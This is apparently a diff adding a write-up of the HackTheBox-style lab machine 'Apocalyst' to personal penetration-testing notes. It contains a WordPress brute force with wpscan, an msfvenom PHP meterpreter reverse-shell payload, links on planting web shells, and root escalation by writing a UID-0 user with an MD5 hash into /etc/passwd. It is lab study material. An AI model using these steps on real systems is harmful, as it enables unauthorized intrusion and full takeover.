@@ -52,6 +52,77 @@ post/multi/recon/local_exploit_suggester
 - To escalate privilage, use the below exploit
 exploit/windows/local/ms14_070_tcpip_ioctl
 
+6. Apocalypse(10.10.10.46)
+
+General Info :
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+
+System Info :
+DISTRIB_ID=Ubuntu
+DISTRIB_CODENAME=xenial
+DISTRIB_DESCRIPTION="Ubuntu 16.04.2 LTS"
+NAME="Ubuntu"
+VERSION="16.04.2 LTS (Xenial Xerus)"
+ID_LIKE=debian
+Linux apocalyst 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+
+Hack:
+- Creation of wordlist from wordpress article on default home page using cewl
+cewl -w wordlist.txt -d 1 -m 5 domain.com
+-w = write to fie 
+-d = depth of crwaling
+-m = minimum word length
+
+
+- Use "dirbuster" to bruteforce webpage with the above created list. 
+(## Use dirbuster(GUI) to see the repose content size easily. One directory has a different size from rest)
+
+- Founded directory (Rightiousness) has a different size which has a image. Download the image. 
+
+- Their is a file attached with that image by using stagenography.
+
+- Thus we extract the file using stagenography tool "steghide"
+steghide info image.jpg # To get info about the attached file
+steghide extract -sf image.jpg # To extract the txt file from the image.
+
+
+
+- use wpscan to find username
+wpscan --url http://ip --enumerate -u
+
+- Use above user and previously extracted txt file as password file to crack the wp-login page(Admin login).
+wpscan --url http://ip --wordlist list.txt --username falaraki
+
+- Upload a php shell in either wp-theme or wp-plugin
+msfvenom -p php/meterpreter_reverse_tcp LHOST=YourIP LPORT=YourPort -f raw > shell.php ## To create php shell
+https://hackingnewideas.wordpress.com/2014/01/02/how-to-upload-shell-in-wordpress-sites/  ## Upload shell in theme
+http://www.r00tsec.com/2015/08/howto-create-backdoor-in-wordpress.html  ## Upload shell as plugin
+
+- Run handeller in msfconsole
+
+- Once we get the shell, there is a password saved in .secret file in base64 formate to directly ssh the system.
+
+
+
+Privilage Escalation :
+
+- Upload the "LinEnum.sh" script to enumerate all the week points in the system.
+https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh ## Link to Linux enumeration script
+
+- There is a writting permission on /etc/passwd file
+
+- To add new user we can directly make entry in the passwd file with password hash(MD5). ## As we do not have permission for shadow file.
+dcom:$1$xyz$jAlmRpcFe.aiPOIXET9GG/:0:0:root:/root:/bin/bash ## MD5 password hash with salt in the place of shadow file reference
+
+- To creat md5 sum with salt
+openssl passwd -1 -salt xyz any-password
+
+- No just do
+su - dcom
+
+
 
 
 
